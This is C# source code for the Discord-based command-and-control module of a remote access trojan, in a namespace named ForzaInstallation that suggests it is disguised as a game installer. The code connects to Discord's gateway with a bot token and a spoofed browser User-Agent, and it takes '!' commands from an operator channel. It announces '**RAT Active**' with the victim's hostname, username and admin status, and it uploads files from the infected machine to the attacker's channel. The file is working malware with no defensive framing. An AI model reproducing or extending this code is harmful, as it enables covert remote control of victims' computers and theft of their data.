using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ForzaInstallation.C2
{
    internal class DiscordGateway
    {
        private string _token;
        private string _guildId;
        private string _channelId;
        private ClientWebSocket _ws;
        private CancellationTokenSource _cts;
        private int _heartbeatInterval;
        private Timer _heartbeatTimer;
        private string _lastSeq;
        private bool _reconnecting;
        private string _sessionId;
        private const int IntentGuildMessages = 1 << 9;
        private const int IntentMessageContent = 1 << 15;
        private const int Intents = IntentGuildMessages | IntentMessageContent;
        private CommandHandler _cmdHandler;
        private object _wsLock = new object();
        private bool _heartbeatRunning;

        internal DiscordGateway(string token, string guildId, string channelId, string webhookUrl)
        {
            _token = token;
            _guildId = guildId;
            _channelId = channelId;
            _cmdHandler = new CommandHandler(this, token, channelId, webhookUrl);
            WebhookLogger.Send("c2-init", "PASS", "Gateway object created");
        }

        internal async Task ConnectLoop()
        {
            int retryDelayMs = 1000;
            while (true)
            {
                try
                {
                    await Connect();
                    _heartbeatRunning = false;
                    retryDelayMs = 1000;
                    await ReceiveLoop();
                }
                catch (Exception ex)
                {
                    string msg = (ex.Message != null && ex.Message.Length > 100) ? ex.Message.Substring(0, 100) : (ex.Message != null ? ex.Message : "unknown");
                    WebhookLogger.Send("c2-reconnect", "FAIL", msg);
                }
                await Task.Delay(retryDelayMs);
                if (retryDelayMs < 30000) retryDelayMs = Math.Min(retryDelayMs * 2, 30000);
            }
        }

        private async Task Connect()
        {
            lock (_wsLock)
            {
                if (_ws != null)
                {
                    try { _ws.Dispose(); } catch { }
                    _ws = null;
                }
                _ws = new ClientWebSocket();
                _ws.Options.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
                if (_cts != null)
                {
                    try { _cts.Cancel(); } catch { }
                    try { _cts.Dispose(); } catch { }
                }
                _cts = new CancellationTokenSource();
            }

            var uri = new Uri("wss://gateway.discord.gg/?v=10&encoding=json");
            using (var connectCts = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token))
            {
                connectCts.CancelAfter(TimeSpan.FromSeconds(15));
                ClientWebSocket wsCopy = _ws;
                if (wsCopy != null)
                    await wsCopy.ConnectAsync(uri, connectCts.Token);
            }
            WebhookLogger.Send("c2-ws-connect", "PASS", "WebSocket connected");
        }

        private async Task ReceiveLoop()
        {
            var buffer = new byte[8192];
            var msgBuilder = new StringBuilder();
            while (true)
            {
                ClientWebSocket wsCopy;
                CancellationToken ctCopy;
                lock (_wsLock)
                {
                    if (_ws == null || _ws.State != WebSocketState.Open) break;
                    wsCopy = _ws;
                    ctCopy = _cts != null ? _cts.Token : CancellationToken.None;
                }

                WebSocketReceiveResult result;
                try
                {
                    result = await wsCopy.ReceiveAsync(new ArraySegment<byte>(buffer), ctCopy);
                }
                catch (ObjectDisposedException) { break; }
                catch (WebSocketException) { break; }

                if (result.MessageType == WebSocketMessageType.Close)
                {
                    WebhookLogger.Send("c2-ws-close", "INFO", "Close frame received");
                    break;
                }
                msgBuilder.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
                if (result.EndOfMessage)
                {
                    string json = msgBuilder.ToString();
                    msgBuilder.Clear();
                    ProcessPayload(json);
                }
            }
        }

        private void ProcessPayload(string json)
        {
            try
            {
                var data = JsonDecode(json);
                if (data == null) return;
                object opObj;
                if (!data.TryGetValue("op", out opObj)) return;
                int op = Convert.ToInt32(opObj);
                switch (op)
                {
                    case 10:
                        OnHello(data);
                        break;
                    case 0:
                        OnDispatch(data);
                        break;
                    case 7:
                        WebhookLogger.Send("c2-reconnect-req", "INFO", "Gateway requested reconnect");
                        _reconnecting = true;
                        break;
                    case 9:
                        WebhookLogger.Send("c2-invalid-session", "INFO", "Invalid session, re-identifying");
                        _sessionId = null;
                        _lastSeq = null;
                        _reconnecting = true;
                        break;
                }
            }
            catch
            {
                string jsonSnippet = json != null ? (json.Length > 200 ? json.Substring(0, 200) : json) : "null";
                WebhookLogger.FallbackLogDirect("ProcessPayload failed for: " + jsonSnippet);
            }
        }

        private void OnHello(Dictionary<string, object> data)
        {
            object dObj;
            if (!data.TryGetValue("d", out dObj)) return;
            var d = dObj as Dictionary<string, object>;
            if (d == null) return;
            object hbObj;
            if (!d.TryGetValue("heartbeat_interval", out hbObj)) return;
            _heartbeatInterval = Convert.ToInt32(hbObj);
            WebhookLogger.Send("c2-hello", "PASS", "Heartbeat interval: " + _heartbeatInterval + "ms");

            StartHeartbeat();
            if (!string.IsNullOrEmpty(_sessionId) && !string.IsNullOrEmpty(_lastSeq))
            {
                Resume();
            }
            else
            {
                Identify();
            }
        }

        private void StartHeartbeat()
        {
            lock (_wsLock)
            {
                if (_heartbeatTimer != null)
                {
                    try { _heartbeatTimer.Dispose(); } catch { }
                    _heartbeatTimer = null;
                }
                _heartbeatRunning = true;
                _heartbeatTimer = new Timer(HeartbeatTimerCallback, null, _heartbeatInterval, _heartbeatInterval);
            }
        }

        private async Task SendHeartbeatAsync()
        {
            if (!_heartbeatRunning) return;
            try
            {
                int seq = 0;
                if (!string.IsNullOrEmpty(_lastSeq)) int.TryParse(_lastSeq, out seq);
                string payload = "{\"op\":1,\"d\":" + seq + "}";
                byte[] data = Encoding.UTF8.GetBytes(payload);
                bool sent = false;
                lock (_wsLock)
                {
                    if (_ws != null && _ws.State == WebSocketState.Open)
                    {
                        try
                        {
                            _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, _cts.Token).Wait(2000);
                            sent = true;
                        }
                        catch { }
                    }
                }
                if (sent)
                    WebhookLogger.Send("c2-heartbeat", "PASS", "seq=" + seq);
            }
            catch
            {
                WebhookLogger.FallbackLogDirect("Heartbeat send failed");
            }
        }

        private void HeartbeatTimerCallback(object state)
        {
            var task = SendHeartbeatAsync();
            task.Wait(2000);
        }

        private void SendHeartbeat()
        {
            try
            {
                int seq = 0;
                if (!string.IsNullOrEmpty(_lastSeq)) int.TryParse(_lastSeq, out seq);
                string payload = "{\"op\":1,\"d\":" + seq + "}";
                byte[] data = Encoding.UTF8.GetBytes(payload);
                lock (_wsLock)
                {
                    if (_ws != null && _ws.State == WebSocketState.Open)
                        _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, _cts.Token).Wait(1000);
                }
                WebhookLogger.Send("c2-heartbeat", "PASS", "seq=" + seq);
            }
            catch { }
        }

        private void Identify()
        {
            string payload = "{\"op\":2,\"d\":{\"token\":\"" + EscapeJson(_token) + "\",\"intents\":" + Intents + ",\"properties\":{\"os\":\"windows\",\"browser\":\"chrome\",\"device\":\"\"}}}";
            byte[] data = Encoding.UTF8.GetBytes(payload);
            lock (_wsLock)
            {
                if (_ws != null && _ws.State == WebSocketState.Open)
                    _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, _cts.Token).Wait(1000);
            }
            WebhookLogger.Send("c2-identify", "PASS", "Bot identified");
        }

        private void Resume()
        {
            string lastSeq = _lastSeq != null ? _lastSeq : "null";
            string payload = "{\"op\":6,\"d\":{\"token\":\"" + EscapeJson(_token) + "\",\"session_id\":\"" + EscapeJson(_sessionId) + "\",\"seq\":" + lastSeq + "}}";
            byte[] data = Encoding.UTF8.GetBytes(payload);
            lock (_wsLock)
            {
                if (_ws != null && _ws.State == WebSocketState.Open)
                    _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, _cts.Token).Wait(1000);
            }
            WebhookLogger.Send("c2-resume", "PASS", "Attempting resume with session=" + _sessionId);
        }

        private void OnDispatch(Dictionary<string, object> data)
        {
            object sObj;
            if (data.TryGetValue("s", out sObj) && sObj != null)
                _lastSeq = sObj.ToString();
            string t = null;
            object tObj;
            if (data.TryGetValue("t", out tObj))
                t = tObj as string;
            if (t == "MESSAGE_CREATE")
            {
                object dObj;
                if (!data.TryGetValue("d", out dObj)) return;
                var d = dObj as Dictionary<string, object>;
                if (d != null) HandleMessage(d);
            }
            else if (t == "READY")
            {
                object dObj;
                if (!data.TryGetValue("d", out dObj)) return;
                var d = dObj as Dictionary<string, object>;
                if (d == null) return;
                object userObj;
                if (d.TryGetValue("user", out userObj))
                {
                    var user = userObj as Dictionary<string, object>;
                    object nameObj;
                    string botName = (user != null && user.TryGetValue("username", out nameObj)) ? (nameObj != null ? nameObj.ToString() : "unknown") : "unknown";
                    WebhookLogger.Send("c2-ready", "PASS", "Bot online as " + botName);
                }
                object sidObj;
                if (d.TryGetValue("session_id", out sidObj))
                {
                    _sessionId = sidObj != null ? sidObj.ToString() : null;
                }
                _reconnecting = false;
                if (_heartbeatTimer == null) StartHeartbeat();
                try
                {
                    string welcome = "**RAT Active**\n"
                        + "Host: " + Environment.MachineName + "\n"
                        + "User: " + Environment.UserName + "\n"
                        + "Admin: " + (IsAdmin() ? "YES" : "NO") + "\n\n"
                        + CommandHandler.GetHelpText();
                    SendChannelMessage(welcome);
                }
                catch { }
            }
            else if (t == "RESUMED")
            {
                WebhookLogger.Send("c2-resumed", "PASS", "Session resumed successfully");
                if (_heartbeatTimer == null) StartHeartbeat();
            }
        }

        private void HandleMessage(Dictionary<string, object> msg)
        {
            try
            {
                object chanObj;
                string chanId = msg.TryGetValue("channel_id", out chanObj) ? (chanObj != null ? chanObj.ToString() : null) : null;
                if (chanId != _channelId) return;

                object guildObj;
                string guildId = msg.TryGetValue("guild_id", out guildObj) ? (guildObj != null ? guildObj.ToString() : null) : null;
                if (guildId != _guildId) return;

                object contentObj;
                string content = msg.TryGetValue("content", out contentObj) ? (contentObj != null ? contentObj.ToString() : "") : "";

                object authorObj;
                bool isBot = false;
                if (msg.TryGetValue("author", out authorObj))
                {
                    var author = authorObj as Dictionary<string, object>;
                    if (author != null)
                    {
                        object botObj;
                        isBot = author.TryGetValue("bot", out botObj) && Convert.ToBoolean(botObj);
                    }
                }
                if (isBot) return;
                if (string.IsNullOrEmpty(content) || !content.StartsWith("!")) return;

                string logContent = content.StartsWith("!inject ") ? "!inject [REDACTED]" : content;
                WebhookLogger.Send("c2-command-recv", "PASS", logContent);
                string result = _cmdHandler.Execute(content);
                if (!string.IsNullOrEmpty(result))
                    _cmdHandler.SendReply(result);
            }
            catch (Exception ex)
            {
                string msgStr = (ex.Message != null && ex.Message.Length > 100) ? ex.Message.Substring(0, 100) : (ex.Message != null ? ex.Message : "unknown");
                WebhookLogger.Send("c2-handle-msg", "FAIL", msgStr);
            }
        }

        internal void SendChannelMessage(string content)
        {
            try
            {
                string payload = "{\"content\":\"" + EscapeJson(content) + "\"}";
                byte[] data = Encoding.UTF8.GetBytes(payload);
                var req = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10/channels/" + _channelId + "/messages");
                req.Method = "POST";
                req.ContentType = "application/json";
                req.Headers.Add("Authorization", "Bot " + _token);
                req.ContentLength = data.Length;
                req.Timeout = 10000;
                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);
                using (var r = (HttpWebResponse)req.GetResponse()) { }
            }
            catch
            {
                WebhookLogger.FallbackLogDirect("SendChannelMessage failed");
            }
        }

        internal void SendFile(string filename, byte[] filedata)
        {
            try
            {
                string boundary = "----" + DateTime.Now.Ticks.ToString("x");
                var req = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v10/channels/" + _channelId + "/messages");
                req.Method = "POST";
                req.Headers.Add("Authorization", "Bot " + _token);
                req.ContentType = "multipart/form-data; boundary=" + boundary;
                req.Timeout = 15000;
                using (var s = req.GetRequestStream())
                {
                    byte[] header = Encoding.ASCII.GetBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + EscapeJson(filename) + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
                    s.Write(header, 0, header.Length);
                    s.Write(filedata, 0, filedata.Length);
                    byte[] footer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n");
                    s.Write(footer, 0, footer.Length);
                }
                using (var r = (HttpWebResponse)req.GetResponse()) { }
            }
            catch
            {
                WebhookLogger.FallbackLogDirect("SendFile failed");
            }
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            var sb = new StringBuilder(s.Length);
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"': sb.Append("\\\""); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    default:
                        if (c < 0x20)
                            sb.Append("\\u" + ((int)c).ToString("X4"));
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }

        private static Dictionary<string, object> JsonDecode(string json)
        {
            if (string.IsNullOrEmpty(json)) return null;
            var result = new Dictionary<string, object>();
            int idx = 0;
            if (!SkipWhitespace(json, ref idx) || json[idx] != '{') return null;
            idx++;
            while (idx < json.Length)
            {
                if (!SkipWhitespace(json, ref idx)) break;
                if (json[idx] == '}') { idx++; break; }
                if (json[idx] == ',') { idx++; continue; }

                string key = JsonReadString(json, ref idx);
                if (key == null) return null;
                if (!SkipWhitespace(json, ref idx) || json[idx] != ':') return null;
                idx++;
                object val = JsonReadValue(json, ref idx);
                if (val != null)
                    result[key] = val;
                else
                    return null;
            }
            return result;
        }

        private static string JsonReadString(string json, ref int idx)
        {
            if (!SkipWhitespace(json, ref idx)) return null;
            if (json[idx] != '"') return null;
            idx++;
            var sb = new StringBuilder();
            while (idx < json.Length)
            {
                char c = json[idx];
                if (c == '"') { idx++; return sb.ToString(); }
                if (c == '\\')
                {
                    idx++;
                    if (idx >= json.Length) return null;
                    char next = json[idx];
                    switch (next)
                    {
                        case '"': sb.Append('"'); break;
                        case '\\': sb.Append('\\'); break;
                        case '/': sb.Append('/'); break;
                        case 'n': sb.Append('\n'); break;
                        case 'r': sb.Append('\r'); break;
                        case 't': sb.Append('\t'); break;
                        case 'b': sb.Append('\b'); break;
                        case 'f': sb.Append('\f'); break;
                        case 'u':
                            int uval;
                            if (idx + 4 < json.Length &&
                                int.TryParse(json.Substring(idx + 1, 4),
                                    System.Globalization.NumberStyles.HexNumber,
                                    System.Globalization.CultureInfo.InvariantCulture, out uval))
                            {
                                sb.Append((char)uval);
                                idx += 4;
                            }
                            break;
                        default: sb.Append(next); break;
                    }
                }
                else
                {
                    sb.Append(c);
                }
                idx++;
            }
            return null;
        }

        private static object JsonReadValue(string json, ref int idx)
        {
            if (!SkipWhitespace(json, ref idx)) return null;
            if (idx >= json.Length) return null;
            char c = json[idx];
            if (c == '"') return JsonReadString(json, ref idx);
            if (c == '{') return JsonReadObject(json, ref idx);
            if (c == '[') return JsonReadArray(json, ref idx);
            if (c == 't' && json.Substring(idx).StartsWith("true")) { idx += 4; return true; }
            if (c == 'f' && json.Substring(idx).StartsWith("false")) { idx += 5; return false; }
            if (c == 'n' && json.Substring(idx).StartsWith("null")) { idx += 4; return null; }
            return JsonReadNumber(json, ref idx);
        }

        private static Dictionary<string, object> JsonReadObject(string json, ref int idx)
        {
            var obj = new Dictionary<string, object>();
            idx++;
            while (idx < json.Length)
            {
                if (!SkipWhitespace(json, ref idx)) break;
                if (json[idx] == '}') { idx++; return obj; }
                if (json[idx] == ',') { idx++; continue; }
                string key = JsonReadString(json, ref idx);
                if (key == null) return null;
                if (!SkipWhitespace(json, ref idx) || json[idx] != ':') return null;
                idx++;
                object val = JsonReadValue(json, ref idx);
                obj[key] = val;
            }
            return null;
        }

        private static List<object> JsonReadArray(string json, ref int idx)
        {
            var list = new List<object>();
            idx++;
            while (idx < json.Length)
            {
                if (!SkipWhitespace(json, ref idx)) break;
                if (json[idx] == ']') { idx++; return list; }
                if (json[idx] == ',') { idx++; continue; }
                object val = JsonReadValue(json, ref idx);
                list.Add(val);
            }
            return null;
        }

        private static object JsonReadNumber(string json, ref int idx)
        {
            if (!SkipWhitespace(json, ref idx)) return null;
            int start = idx;
            if (idx < json.Length && json[idx] == '-') idx++;
            while (idx < json.Length && json[idx] >= '0' && json[idx] <= '9') idx++;
            bool isFloat = false;
            if (idx < json.Length && json[idx] == '.')
            {
                isFloat = true;
                idx++;
                while (idx < json.Length && json[idx] >= '0' && json[idx] <= '9') idx++;
            }
            if (idx < json.Length && (json[idx] == 'e' || json[idx] == 'E'))
            {
                isFloat = true;
                idx++;
                if (idx < json.Length && (json[idx] == '+' || json[idx] == '-')) idx++;
                while (idx < json.Length && json[idx] >= '0' && json[idx] <= '9') idx++;
            }
            string numStr = json.Substring(start, idx - start);
            if (string.IsNullOrEmpty(numStr)) return null;
            if (isFloat)
            {
                double d;
                double.TryParse(numStr, System.Globalization.NumberStyles.Float, System.Globalization.CultureInfo.InvariantCulture, out d);
                return d;
            }
            else
            {
                long l;
                if (long.TryParse(numStr, out l))
                {
                    if (l >= int.MinValue && l <= int.MaxValue) return (int)l;
                    return l;
                }
                return null;
            }
        }

        private static bool SkipWhitespace(string json, ref int idx)
        {
            while (idx < json.Length && (json[idx] == ' ' || json[idx] == '\t' || json[idx] == '\n' || json[idx] == '\r'))
                idx++;
            return idx < json.Length;
        }

        private static bool IsAdmin()
        {
            try
            {
                var id = System.Security.Principal.WindowsIdentity.GetCurrent();
                var p = new System.Security.Principal.WindowsPrincipal(id);
                return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }
    }
}
